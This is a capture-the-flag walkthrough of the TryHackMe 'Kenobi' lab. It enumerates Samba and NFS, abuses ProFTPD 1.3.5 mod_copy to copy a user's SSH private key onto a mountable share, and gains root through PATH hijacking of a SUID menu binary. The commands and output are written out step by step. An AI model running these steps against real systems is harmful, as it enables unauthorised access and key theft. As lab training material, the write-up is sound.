---
title: 'Kenobi - TryHackMe Walkthrough'
date: 2020-06-25 00:00:00
featured_image: '/images/posts/THMlogo.png'
excerpt: Exploiting a Linux machine and enumerate Samba for shares, manipulate proftpd and escalate privileges with path variable manipulation
---
![](/images/posts/kenobi-thm.png)

### Goal
- Exploiting a Linux machine.
- Enumerate Samba for shares, manipulate proftpd and escalate privileges with path variable manipulation

### Reconnaissance
 With nmap scan found the below ports are open ports and running services on the target:   

```bash
  $ nmap 10.10.143.1 -vvv
    PORT     STATE SERVICE      REASON
    21/tcp   open  ftp          syn-ack
    22/tcp   open  ssh          syn-ack
    80/tcp   open  http         syn-ack
    111/tcp  open  rpcbind      syn-ack
    139/tcp  open  netbios-ssn  syn-ack
    445/tcp  open  microsoft-ds syn-ack
    2049/tcp open  nfs          syn-ack
```

### Samba
Samba allows end users to access the files, printers and commonly shared resources on the intra and internet. Often referred as Network File System.
It is based on *common client/server protocol of Server Message Block (SMB)*.
**Note**: SMB is developed only for Windows, so without Samba other than Windows platforms would be isolated in the network.  

The server has Samba running, so enumerating for shares:

` nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.143.1 `

Found below user names and their paths:  
guest - C:\tmp  
anonymous - C:\home\kenobi\share  
print  - \var\lib\samba\printers  

There is a `log.txt` file under anonymous id which contains SSH, FTPd and other information.


    nmap  -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.48.174

    PORT    STATE SERVICE
    111/tcp open  rpcbind
    | nfs-showmount:
    |_  /var *

The `/var` location is available to mount.

### Exploiting the FTP service
With a simple netcat, we can connect to FTPd service and get the version it is running.
```bash
$ nc 10.10.48.174 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.48.174]
```

From above, we can see the proFTPD is running on 1.3.5 version.

Lets see if there are any exploits available for proFTPD 1.3.5

    $ searchsploit proftpd 1.3.5
    --------------------------------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                                                     |  Path
    --------------------------------------------------------------------------------------------------- ---------------------------------
    ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                          | linux/remote/37262.rb
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                | linux/remote/36803.py
    ProFTPd 1.3.5 - File Copy                                                                          | linux/remote/36742.txt
    --------------------------------------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results
Using the mod copy exploit, we can copy the private key that we see in the log.txt to a location where we can access:

    nc 10.10.48.174 21
    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.48.174]

    SITE CPFR /home/kenobi/.ssh/id_rsa
    350 File or directory exists, ready for destination name
    SITE CPTO /var/tmp/id_rsa
    250 Copy successful
Mount the /var on our system to access the file:

    sudo mount 10.10.48.174:/var /mnt/kenobiNFS/

Copy the mnt/kenobiNFS/tmp/id_rsa to a directory and then ssh into the server

    ssh -i id_rsa kenobi@10.10.48.174

### Privilege Escalation  

Finding any abnormal files with SUID bit:

    find / -perm -u=s -type f -exec ls -l {} \; 2>/dev/null
    -rwsr-xr-x 1 root root 94240 May  8  2019 /sbin/mount.nfs
    -rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
    -rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    -rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
    -rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    -rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
    -rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
    -rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
    -rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
    -rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
    -rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu
    -rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
    -rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
    -rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
    -rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
    -rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
    -rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
    -rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
    -rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
    -rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
    -rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6

From the above, we can see the `/usr/bin/menu` seems a custom program and lets see if we can do any on this.

The functionality of this custom program seems checking  web connection using `curl`, kernel version and ip status using `ifconfig`.

    kenobi@kenobi:~$ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :1
    HTTP/1.1 200 OK
    Date: Mon, 29 Jun 2020 22:38:57 GMT
    Server: Apache/2.4.18 (Ubuntu)
    Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT
    ETag: "c8-591b6884b6ed2"
    Accept-Ranges: bytes
    Content-Length: 200
    Vary: Accept-Encoding
    Content-Type: text/html

    kenobi@kenobi:~$ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :2
    4.8.0-58-generic
    kenobi@kenobi:~$ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :3
    eth0      Link encap:Ethernet  HWaddr 02:29:8f:02:e1:de  
              inet addr:10.10.96.188  Bcast:10.10.255.255  Mask:255.255.0.0
              inet6 addr: fe80::29:8fff:fe02:e1de/64 Scope:Link
              UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
              RX packets:2405 errors:0 dropped:0 overruns:0 frame:0
              TX packets:2269 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1000
              RX bytes:155505 (155.5 KB)  TX bytes:3081289 (3.0 MB)

    lo        Link encap:Local Loopback  
              inet addr:127.0.0.1  Mask:255.0.0.0
              inet6 addr: ::1/128 Scope:Host
              UP LOOPBACK RUNNING  MTU:65536  Metric:1
              RX packets:214 errors:0 dropped:0 overruns:0 frame:0
              TX packets:214 errors:0 dropped:0 overruns:0 carrier:0
              collisions:0 txqueuelen:1
              RX bytes:15541 (15.5 KB)  TX bytes:15541 (15.5 KB)

- Using the environment variable manipulation we can manipulate the command to execute with our custom command.
- As the "status check" is using the curl command, we create a dummy curl file  `/tmp/curl` which executes `/bin/sh`. The path `/tmp` will be added to start of the `PATH` variable.  When a binary is called, it will  always check from left to right and our `/tmp/curl` will be picked up.
- As `/usr/bin/menu` has the effective user as root, our command will get execute with root which in turn spawns a root shell.  

```bash
    kenobi@kenobi:/tmp$ echo /bin/sh > curl
    kenobi@kenobi:/tmp$ chmod 755 curl
    kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
    kenobi@kenobi:/tmp$ echo $PATH
    /tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
    kenobi@kenobi:/tmp$ /usr/bin/menu
    ***************************************
    1. status check
    2. kernel version
    3.  ifconfig
    ** Enter your choice :1
     # id
    uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

### CTF
The flag in /root/root.txt is `177b3cd8562--------2721c28381f02`
